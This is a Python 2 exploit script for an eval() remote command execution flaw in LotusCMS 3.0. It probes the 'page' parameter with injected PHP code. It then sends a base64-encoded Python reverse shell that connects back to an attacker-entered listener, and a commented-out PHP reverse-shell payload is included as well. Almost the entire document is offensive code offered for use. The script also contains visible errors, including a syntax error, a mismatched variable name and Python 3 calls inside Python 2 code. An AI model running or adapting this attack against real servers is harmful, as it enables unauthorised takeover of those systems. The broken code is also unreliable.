
import sys,urllib,urllib2,re,base64,getpass,parse
from optparse import OptionParser
from random import choice

usage = "./%prog -t <target> -d <directory>"
usage += "\nExample 1: /%prog -t localhost -d /lcms/"
usage += "\nExample 2: /%prog -t 192.168.1.10:8080 -d /"

parser = OptionParser(usage=usage)
parser.add_option("-t", type="string",action="store",dest="target",help="The Target Server <server:port>")
parser.add_option("-d", type="string",action="store",dest="dirPath",help="Directory path to the CMS")

(options, args) = parser.parse_args()

def banner():
    print "\n\t|----------------------------------------------|"
    print "\t| LotusCMS 3.0 eval() Remote Command Execution |"
    print "\t| by WarMarX ----------------------------------|\n"

if len(sys.argv) < 5:
    banner()
    parser.print_help()
    sys.exit(1)

location = "http://" + options.target + options.dirPath + "index.php?page="
agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
        "Microsoft Internet Explorer/4.0b1 (Windows 95)",
        "Opera/8.00 (Windows NT 5.1; U; en)"]
agent = choice(agents)


def getServerResponse(host):
    try:
        req = urllib2.Request(host)
        req.addheaders = [('User-agent',agent)]
        check = urllib2.urlopen(req).read()    
    except urllib2.HTTPError, error:
        check = error.read()
        pass
    return check

def pageExist():
    resultTemp = urllib2.Request(location + "index")
    resultTemp.addheaders = [('User-agent',agent)]
    status = urllib2.urlopen(resultTemp).getcode()

    if(status == 200):
        sys.stdout.write("[+] Page exists checking for Vulerability...\n")
        sys.stdout.flush()
    else:
        sys.stdout.write("[-] Page Does Not Exists \nExiting.......\n")
        sys.stdout.flush()
        sys.exit(1)

def checkVuln():
    response = getServerResponse(location + "index%27%29%3B%24%7Bprint%28%27WarMarX%27%29%7D%3B%23")
    
    if re.findall("WarMarX",response):
        sys.stdout.write("[+] PHP code execution vulnerability exists in this page\n")
        sys.stdout.write("    Spawning Shell\n")
        sys.stdout.flush()
    else:
        sys.stdout.write("[-] Vulnerability Does not Exists \nExiting.......\n")
        sys.stdout.flush()
        sys.exit(1)

def exploit():
    print("Enter your listener's details")
    ip = raw_input("IP address:")
    port = raw_input("Port:"))
    response = getServerResponse(location + "index%27%29%3B%24%7Bsystem%28%27which%20python%27%29%7D%3B%23%22")
    
    if re.findall("python3",response):
        pain = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" """ + ip +""" ","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        encoded = "index');${system('echo " + base64.b64encode(plain) + " | base64 -d | sh ')};#"
        urlen = urllib.parse.quote(encoded)
        response = getServerResponse(location + urlen)
    
    #response = getServerResponse(location + "index%27%29%3B%24%7Bsystem%28%27php%20-r%20%27%24sock%3Dfsockopen%28"+ip+"%2C"+port+"%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27%27%29%7D%3B%23%22")
    sys.exit(1)

if __name__ == "__main__":
    banner()
    pageExist()
    checkVuln()
    exploit()